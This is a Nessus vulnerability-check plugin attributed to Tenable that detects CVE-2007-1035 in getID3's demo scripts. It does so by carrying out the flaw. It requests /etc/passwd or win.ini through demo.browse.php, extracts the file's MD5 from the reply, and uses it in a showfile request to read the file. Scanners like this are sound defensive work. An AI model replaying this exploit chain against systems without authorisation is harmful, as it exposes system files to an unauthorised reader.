#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24746);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2017/05/16 19:35:39 $");

  script_cve_id("CVE-2007-1035");
  script_bugtraq_id(22587);
  script_osvdb_id(35161);

  script_name(english:"getID3 < 1.7.8-b1 Multiple Remote Vulnerabilities");
  script_summary(english:"Attempts to read a file with getID3's demo.browse.php.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"getID3, a web-based tool for extracting information from MP3 files, is
installed on the remote web server.

The installation of getID3 includes a set of demo scripts that allow
an unauthenticated, remote attacker to read and delete arbitrary
files, write files with some restrictions, and execute arbitrary code,
all subject to the privileges under which the web server runs.

Note that getID3 may be installed in support of another application,
such as the Drupal Audio or Mediafield modules." );
  script_set_attribute(attribute:"see_also", value:"https://www.drupal.org/node/119385" );
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e0625253" );
  script_set_attribute(attribute:"solution", value:
"Either remove the getID3 'demos' directory or upgrade to getID3
version 1.7.8b1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value: "2007/03/01");
  script_set_attribute(attribute:"vuln_publication_date", value: "2007/02/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:drupal:drupal");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:drupal:audio_module");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:drupal:getid3");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:drupal:mediafield_module");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl","os_fingerprint.nasl", "drupal_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

port = get_http_port(default:80, embedded:FALSE, php:TRUE);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/getid3", cgi_dirs()));
else dirs = make_list(cgi_dirs());

app = "Drupal";
get_install_count(app_name:app, exit_if_zero:FALSE);

installs = get_installs(app_name:app, port:port);
if (!isnull(installs[1]))
{
  foreach install (installs[1])
  {
    dir = install['path'];
    dirs = make_list(dir + "/modules/audio/getid3", dirs);
  }
}

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

vuln = FALSE;
non_vuln= make_list();

foreach dir (dirs)
{
  install = build_url(qs:dir, port:port);
  foreach file (files)
  {
    # Try to exploit the flaw to read a file.
    url = "/demos/demo.browse.php";

    # First we need to get the MD5 checksum.
    w = http_send_recv3(method:"GET",
      item: dir + url + "?" +"filename=/" +file,
      port:port,
      exit_on_fail:TRUE
    );
    res = w[2];
    attack_req1 = install + url + "?" +"filename=/" +file;

    md5 = NULL;
    if ("<b>md5_file</b>" >< res)
    {
      pat = '<b>md5_file</b></td><td valign="top">string&nbsp;\\(32\\)</td><td>([^<]+)</td>';
      matches = egrep(pattern:pat, string:res);
      if (matches)
      {
        foreach match (split(matches))
        {
          match = chomp(match);
          m = eregmatch(pattern:pat, string:match);
          if (!isnull(m))
          {
            md5 = m[1];
            break;
          }
        }
      }
    }

    # Try to retrieve the file now that we have the MD5 file.
    if (md5)
    {
      w = http_send_recv3(method:"GET",
        item: dir + url + "?" + "showfile=/" + file + "&" + "md5=" + md5,
        port:port,
        exit_on_fail:TRUE
      );
      res = w[2];

      # There's a problem if there's an entry for root.
      if (egrep(pattern:file_pats[file], string:res))
      {
        attack_req2 = dir + url + "?" + "showfile=/" + file + "&" + "md5="+md5;
        vuln = TRUE;
        break;
      }
      else non_vuln = list_uniq(make_list(non_vuln, install));
    }
    if (vuln)break;
  }
  if (vuln) break;
}

if (vuln)
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    file        : file,
    request     : make_list(attack_req1, attack_req2),
    output      : chomp(res),
    attach_type : 'text/plain'
  );
  exit(0);
}
else
{
  installs = max_index(non_vuln);
  if (installs == 0) audit(AUDIT_WEB_APP_NOT_INST, 'getID3', port);
  else if (installs == 1) audit(AUDIT_WEB_APP_NOT_AFFECTED, 'getID3', non_vuln[0]);
  else exit(0, "None of the getID3 installs (" + join(non_vuln, sep:" & ") + ") are affected.");
}
